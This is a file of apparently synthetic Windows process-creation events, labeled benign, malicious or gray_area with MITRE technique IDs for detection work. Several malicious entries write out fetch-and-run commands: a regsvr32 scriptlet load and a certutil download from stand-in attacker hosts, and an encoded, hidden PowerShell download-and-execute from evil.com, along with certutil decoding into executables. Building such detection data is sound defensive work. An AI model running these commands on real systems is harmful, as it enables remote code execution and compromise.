  {
    "UtcTime": "2024-07-05T15:20:44.008Z",
    "ProcessGuid": "{7B48E9DB-1676-4EC2-B4CC-0B2441D606FA}",
    "ProcessId": 1774,
    "Image": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
    "CommandLine": "firefox.exe -contentproc -childID 7",
    "ParentImage": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
    "ParentCommandLine": "\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"",
    "ParentProcessId": 45178,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Low",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T11:25:58.245Z",
    "ProcessGuid": "{91B1287E-F369-4FAC-981E-BF689DBE47CE}",
    "ProcessId": 37181,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c whoami",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 22077,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T15:18:16.928Z",
    "ProcessGuid": "{770515C4-C287-4402-9A33-F41FE9BEB971}",
    "ProcessId": 28431,
    "Image": "C:\\Users\\itops\\Downloads\\installer.exe",
    "CommandLine": "installer.exe --silent --accept-license",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 27515,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T16:14:08.764Z",
    "ProcessGuid": "{86794625-99F4-4CE8-AD1F-7C6905E5C17D}",
    "ProcessId": 26624,
    "Image": "C:\\Windows\\System32\\taskmgr.exe",
    "CommandLine": "taskmgr.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 53217,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T15:41:45.502Z",
    "ProcessGuid": "{8088911C-A946-4B12-89F2-B1B2B4B3253A}",
    "ProcessId": 30371,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 52965,
    "User": "CORP\\analyst02",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T00:07:49.731Z",
    "ProcessGuid": "{8A7B6D5B-C6A6-468F-B37A-3CCF04950EFF}",
    "ProcessId": 17315,
    "Image": "C:\\Windows\\System32\\taskeng.exe",
    "CommandLine": "taskeng.exe {GUID} S",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 26218,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T23:50:28.239Z",
    "ProcessGuid": "{FC8A2ACF-A880-4761-B3CA-95C583982CCB}",
    "ProcessId": 35996,
    "Image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "CommandLine": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 16674,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T13:19:48.399Z",
    "ProcessGuid": "{1DCA5F42-87E4-43BF-AE6C-1BB2C39D1CD3}",
    "ProcessId": 56931,
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "CommandLine": "chrome.exe --no-first-run",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 59434,
    "User": "CORP\\netadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-06T01:59:34.180Z",
    "ProcessGuid": "{287085F1-5E32-4F46-95BC-86C8855E1795}",
    "ProcessId": 11357,
    "Image": "C:\\Windows\\System32\\regsvr32.exe",
    "CommandLine": "regsvr32 /s /n /u /i:http://evil-payload5976.top/payloads/file215.sct scrobj.dll",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c",
    "ParentProcessId": 52478,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1218.010",
    "technique_name": "Regsvr32 Squiblydoo",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-04T16:23:01.371Z",
    "ProcessGuid": "{72919E2E-039F-4575-A8D6-1975C30F0C92}",
    "ProcessId": 21241,
    "Image": "C:\\Windows\\System32\\taskhostw.exe",
    "CommandLine": "taskhostw.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 12813,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T16:58:02.235Z",
    "ProcessGuid": "{E84637D8-C657-4F6D-9867-D5147D048ACE}",
    "ProcessId": 14855,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c net user",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 60065,
    "User": "CORP\\netadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-07T01:19:28.895Z",
    "ProcessGuid": "{8F835CBE-9AD8-4516-8DEB-D8EB747AB16A}",
    "ProcessId": 37767,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -ep bypass -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAJwApAA==",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "ParentCommandLine": "WINWORD.EXE /n",
    "ParentProcessId": 6740,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1059.001",
    "technique_name": "PowerShell Encoded Command",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-03T10:29:58.545Z",
    "ProcessGuid": "{932C98D3-C443-418A-A30E-7E7D27163339}",
    "ProcessId": 23434,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c net view \\\\fileserver",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 36800,
    "User": "CORP\\analyst02",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T14:15:32.803Z",
    "ProcessGuid": "{1A359B8A-E826-485E-BB6D-3891C830931A}",
    "ProcessId": 53221,
    "Image": "C:\\Windows\\System32\\mmc.exe",
    "CommandLine": "mmc.exe compmgmt.msc",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 53351,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T20:31:01.114Z",
    "ProcessGuid": "{58B3072D-C351-437E-A1EC-AC7143E11E55}",
    "ProcessId": 61889,
    "Image": "C:\\Program Files\\Slack\\Slack.exe",
    "CommandLine": "Slack.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 24788,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T12:32:19.682Z",
    "ProcessGuid": "{E74592DD-18E5-4F85-89A6-F300658DFFEF}",
    "ProcessId": 27764,
    "Image": "C:\\Windows\\System32\\notepad.exe",
    "CommandLine": "notepad.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 22376,
    "User": "CORP\\netadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T13:27:04.971Z",
    "ProcessGuid": "{7F48632A-3801-4FBC-801A-65140DAEA901}",
    "ProcessId": 44531,
    "Image": "C:\\Program Files\\Slack\\Slack.exe",
    "CommandLine": "Slack.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 61343,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T11:23:31.608Z",
    "ProcessGuid": "{E89EA8E5-6C05-4EBF-BC81-105D8CC55C2F}",
    "ProcessId": 30235,
    "Image": "C:\\Users\\itops\\Downloads\\installer.exe",
    "CommandLine": "installer.exe --silent --accept-license",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 12638,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T08:30:06.302Z",
    "ProcessGuid": "{8D647FA9-4CAD-4DCA-8228-3ED4A738BA25}",
    "ProcessId": 28261,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'}\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 61329,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T12:14:52.938Z",
    "ProcessGuid": "{5916B510-4E3D-43D0-B564-0EEEA523116D}",
    "ProcessId": 48940,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c ping 8.8.8.8",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 38755,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T17:37:16.247Z",
    "ProcessGuid": "{D07DA830-2823-4178-BFC7-C678CFF09279}",
    "ProcessId": 55540,
    "Image": "C:\\Windows\\System32\\bitsadmin.exe",
    "CommandLine": "bitsadmin.exe /transfer wsus_update /download /priority normal http://internal-wsus.corp.local/update_kb1392951.cab C:\\Windows\\SoftwareDistribution\\Download\\update_kb1392951.cab",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s BITS",
    "ParentProcessId": 51735,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-01T14:24:26.979Z",
    "ProcessGuid": "{7BA003E9-3468-4AC2-9A53-4C6F3EB4A3D7}",
    "ProcessId": 52649,
    "Image": "C:\\Windows\\System32\\mmc.exe",
    "CommandLine": "mmc.exe diskmgmt.msc",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 64951,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T03:16:30.653Z",
    "ProcessGuid": "{D3F9F284-2897-4CFC-BBC0-297B8973C75F}",
    "ProcessId": 20583,
    "Image": "C:\\Windows\\System32\\conhost.exe",
    "CommandLine": "conhost.exe 0xffffffff -ForceV1",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 14023,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T00:54:06.441Z",
    "ProcessGuid": "{82737D41-BA52-412B-BD26-864B5DAF00E8}",
    "ProcessId": 9777,
    "Image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "CommandLine": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 58832,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T01:26:23.692Z",
    "ProcessGuid": "{0A79FF47-C1C5-4481-BA81-4EBC3B540A9E}",
    "ProcessId": 48158,
    "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
    "CommandLine": "\"C:\\Program Files\\Windows Defender\\MsMpEng.exe\"",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 16566,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T11:09:01.047Z",
    "ProcessGuid": "{3D08F5DF-CC78-4AE4-90BB-B164AAD54297}",
    "ProcessId": 17046,
    "Image": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
    "CommandLine": "Acrobat.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 65483,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T16:37:21.890Z",
    "ProcessGuid": "{275EF016-E364-4B3E-8F8F-9C63F3012ED2}",
    "ProcessId": 7577,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 58290,
    "User": "CORP\\helpdesk",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T21:26:56.644Z",
    "ProcessGuid": "{06571B96-AF19-4291-9567-407B7B041D36}",
    "ProcessId": 38727,
    "Image": "C:\\Program Files\\Microsoft VS Code\\Code.exe",
    "CommandLine": "Code.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 13742,
    "User": "CORP\\netadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T12:04:06.570Z",
    "ProcessGuid": "{8173D13D-92F1-4E45-B56D-032DE82BCE0A}",
    "ProcessId": 4850,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil -decode C:\\Users\\Public\\encoded7782.txt C:\\Users\\Public\\decoded2282.exe",
    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 4415,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1140",
    "technique_name": "Certutil Base64 Decode",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-05T19:28:59.360Z",
    "ProcessGuid": "{E7118B14-EA55-493B-A3AC-30240FBF4DF2}",
    "ProcessId": 60145,
    "Image": "C:\\Windows\\System32\\smss.exe",
    "CommandLine": "smss.exe",
    "ParentImage": "C:\\Windows\\System32\\smss.exe",
    "ParentCommandLine": "smss.exe",
    "ParentProcessId": 21653,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T22:27:10.706Z",
    "ProcessGuid": "{C3076B9B-645B-40FE-BEEE-1BB57F2CB8D9}",
    "ProcessId": 30091,
    "Image": "C:\\Windows\\System32\\spoolsv.exe",
    "CommandLine": "C:\\Windows\\System32\\spoolsv.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 24038,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T09:59:30.032Z",
    "ProcessGuid": "{645426B1-B7A3-496C-A2C3-C093DCE71EC8}",
    "ProcessId": 19814,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c ping google.com",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 27795,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T16:46:20.804Z",
    "ProcessGuid": "{4595F793-6634-47C0-8022-D21B44230CF2}",
    "ProcessId": 32891,
    "Image": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
    "CommandLine": "firefox.exe -contentproc -childID 7",
    "ParentImage": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
    "ParentCommandLine": "\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"",
    "ParentProcessId": 20663,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Low",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T09:33:00.384Z",
    "ProcessGuid": "{3AB2A433-3F47-49F4-BEEB-011BB0B1786E}",
    "ProcessId": 43896,
    "Image": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
    "CommandLine": "Acrobat.exe C:\\Users\\netadmin\\Documents\\report.pdf",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\"",
    "ParentProcessId": 14462,
    "User": "CORP\\netadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T20:17:15.983Z",
    "ProcessGuid": "{A09D03DD-00E3-4DD2-A7FB-11D2B6E8BCD7}",
    "ProcessId": 8434,
    "Image": "C:\\Windows\\System32\\lsass.exe",
    "CommandLine": "C:\\Windows\\System32\\lsass.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 2698,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T13:46:07.493Z",
    "ProcessGuid": "{75563FAF-13B3-4A0A-8BFB-BFA7C51C87E6}",
    "ProcessId": 45251,
    "Image": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
    "CommandLine": "Acrobat.exe C:\\Users\\klee\\Documents\\report.pdf",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\"",
    "ParentProcessId": 32379,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T17:18:41.995Z",
    "ProcessGuid": "{B044193C-7702-4286-A9F7-FB3CC3AC44EA}",
    "ProcessId": 11969,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil.exe -hashfile C:\\Users\\admin\\Downloads\\tool.exe SHA256",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 1035,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-04T02:43:41.469Z",
    "ProcessGuid": "{FBECBB97-9C42-4A92-8BDF-570B742BB35F}",
    "ProcessId": 6618,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil -decode C:\\Users\\Public\\encoded6953.txt C:\\Users\\Public\\decoded3055.exe",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "powershell.exe",
    "ParentProcessId": 1676,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1140",
    "technique_name": "Certutil Base64 Decode",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-04T03:09:45.435Z",
    "ProcessGuid": "{4E9797D4-DE85-4C19-8B38-E5865C5A9DAE}",
    "ProcessId": 55292,
    "Image": "C:\\Windows\\System32\\bitsadmin.exe",
    "CommandLine": "bitsadmin.exe /transfer wsus_update /download /priority normal http://internal-wsus.corp.local/update_kb7061063.cab C:\\Windows\\SoftwareDistribution\\Download\\update_kb7061063.cab",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s BITS",
    "ParentProcessId": 28004,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-05T12:52:00.289Z",
    "ProcessGuid": "{4DA80092-BBE0-4DE4-9481-11ACDF5C55BA}",
    "ProcessId": 48582,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 20566,
    "User": "CORP\\analyst02",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T11:53:51.485Z",
    "ProcessGuid": "{E2FA5028-5A36-45BB-89F8-0EF0881E44AA}",
    "ProcessId": 23368,
    "Image": "C:\\Windows\\System32\\regsvr32.exe",
    "CommandLine": "regsvr32.exe /s C:\\Program Files\\Common Files\\System\\Ole DB\\oledb32.dll",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c",
    "ParentProcessId": 19792,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-01T11:45:37.500Z",
    "ProcessGuid": "{50B89480-AAE7-43C0-8C0B-A477D8F451F8}",
    "ProcessId": 6959,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c net view \\\\fileserver",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 59909,
    "User": "CORP\\helpdesk",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T03:19:25.056Z",
    "ProcessGuid": "{6173EC51-F36C-40D9-84DD-3FF838C94038}",
    "ProcessId": 42436,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil.exe -urlcache -split -f http://stager7154.io/sys800.exe C:\\Users\\Public\\svc554.exe",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "powershell.exe",
    "ParentProcessId": 63837,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1105",
    "technique_name": "Certutil Download",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-02T21:36:39.684Z",
    "ProcessGuid": "{AB71E363-9DB7-41EE-9455-CD555A45848A}",
    "ProcessId": 25837,
    "Image": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
    "CommandLine": "firefox.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 23046,
    "User": "CORP\\pchen",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T20:07:28.305Z",
    "ProcessGuid": "{539B9A30-9541-42B5-B85B-E69C82A58A0A}",
    "ProcessId": 38515,
    "Image": "C:\\Windows\\System32\\bitsadmin.exe",
    "CommandLine": "bitsadmin.exe /transfer wsus_update /download /priority normal http://sccm01.corp.local/update_kb3077237.cab C:\\Windows\\SoftwareDistribution\\Download\\update_kb3077237.cab",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s BITS",
    "ParentProcessId": 49290,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-05T08:00:41.956Z",
    "ProcessGuid": "{F2195536-0A36-48D5-A037-532EE1310C7C}",
    "ProcessId": 11284,
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "CommandLine": "msiexec.exe /i C:\\Temp\\update_7.2.71.msi /passive /norestart",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 34132,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T04:38:45.960Z",
    "ProcessGuid": "{84432EEC-4A6C-4BD2-A488-C7236E7BADF4}",
    "ProcessId": 6552,
    "Image": "C:\\Windows\\System32\\spoolsv.exe",
    "CommandLine": "C:\\Windows\\System32\\spoolsv.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 21288,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
